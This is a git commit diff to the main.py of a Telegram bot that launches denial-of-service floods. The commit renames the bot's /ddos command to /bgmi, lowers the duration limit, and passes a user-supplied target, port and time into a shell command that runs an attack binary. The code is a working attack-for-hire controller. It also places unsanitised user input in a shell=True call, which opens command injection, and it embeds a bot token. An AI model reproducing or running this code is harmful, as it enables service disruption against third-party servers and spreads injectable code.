b81c50fea17d34fbecfab695042b871eb70a4661
NullByte <53062530+ExploitTheLoop@users.noreply.github.com>
2024-09-27 14:58:10 +0600

    Update main.py

--- main.py
+++ main.py
@@ -4,33 +4,33 @@ import telebot
 import subprocess
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7073204956:AAHtrbmX-dijQy2SC_OV7FmCVJleJcZQXsA')
+bot = telebot.TeleBot('7073204909:AAHtrbmX-dijQy2SC_OV7FmCVJleJcZQXsA')
 
-# Handler for /ddos command
-@bot.message_handler(commands=['ddos'])
-def handle_ddos(message):
+# Handler for /bgmi command
+@bot.message_handler(commands=['bgmi'])
+def handle_bgmi(message):
     command = message.text.split()
     if len(command) == 4:  # Accept target, port, and time
         target = command[1]
         port = int(command[2])  # Convert port to integer
         time = int(command[3])  # Convert time to integer
         
-        if time > 1000:
-            response = "Error: Time interval must be less than 1000."
+        if time > 181:
+            response = "Error: Time interval must be less than 181."
         else:
             start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-            full_command = f"./ddos {target} {port} {time} 200"
+            full_command = f"./bgmi {target} {port} {time} 200"
             subprocess.run(full_command, shell=True)  # Run the command in the shell
-            response = f"ddos Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
+            response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
     else:
-        response = '''Usage: /ddos <target> <port> <time>
-Example: /ddos 192.168.1.1 80 60
+        response = '''Usage: /bgmi <target> <port> <time>
+Example: /bgmi 192.168.1.1 80 60
 '''
     bot.reply_to(message, response)
 
-# Function to handle the reply when users run the /ddos command
+# Function to handle the reply when users run the /bgmi command
 def start_attack_reply(message, target, port, time):
-    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: ddos\nBy ABDEKHTU"
+    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy ABDEKHTU"
     bot.reply_to(message, response)
 
 # Command handler for /help
@@ -38,7 +38,7 @@ def start_attack_reply(message, target, port, time):
 def handle_help(message):
     response = '''Available commands:
     
-/ddos <target> <port> <time> - Start ddos attack
+/bgmi <target> <port> <time> - Start BGMI attack
 '''
     bot.reply_to(message, response)
 
